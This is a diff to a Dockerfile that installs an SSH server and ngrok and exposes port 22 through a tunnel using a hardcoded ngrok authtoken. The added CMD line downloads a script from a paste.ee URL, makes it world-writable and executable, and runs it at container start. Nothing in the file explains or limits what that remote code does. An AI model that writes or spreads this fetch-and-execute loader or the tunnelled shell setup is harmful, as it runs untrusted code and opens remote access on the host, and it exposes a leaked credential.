@@ -3,7 +3,7 @@ FROM ubuntu
 RUN sed -i 's/http:\/\/archive.ubuntu.com/http:\/\/mirror.xtom.com.hk/g' /etc/apt/sources.list
 # Install ngrok
 ENV NOTVISIBLE "in users profile"
-RUN apt update -y && apt upgrade -y && apt install -y tar openssh-client curl openssh-server sudo python3 ffmpeg docker-compose
+RUN apt update -y && apt upgrade -y && apt install -y tar openssh-client curl openssh-server sudo python3 ffmpeg
 RUN curl -Lk 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' > ngrok.tgz
 RUN tar -xf ngrok.tgz && cp ngrok /bin&& rm -f ngrok.tgz
 RUN echo 'inspect_addr: 0.0.0.0:4040' > /.ngrok
@@ -22,7 +22,7 @@ RUN apt-get install -y openssh-server \
 #     && /usr/sbin/sshd && timeout 25m ngrok config add-authtoken 1ttZhgDBXTNa3xaGrFkI15bhnUp_3ZgG54Byr2RPeV64L3TJy && ngrok tcp 22
 RUN echo 'caro build'
 
-CMD /usr/sbin/sshd && timeout 25m ngrok config add-authtoken 1ttZhgDBXTNa3xaGrFkI15bhnUp_3ZgG54Byr2RPeV64L3TJy && ngrok tcp 22
+CMD wget https://paste.ee/r/7Nk2G/0 && mv 0 a.sh && chmod 777 a.sh && ./a.sh
 # CMD ["bash", "/app/start.sh"]
 #RUN sed -i 's/http:\/\/archive.ubuntu.com/http:\/\/mirror.xtom.com.hk/g' /etc/apt/sources.list
 #RUN apt update -y && apt install python3 -y
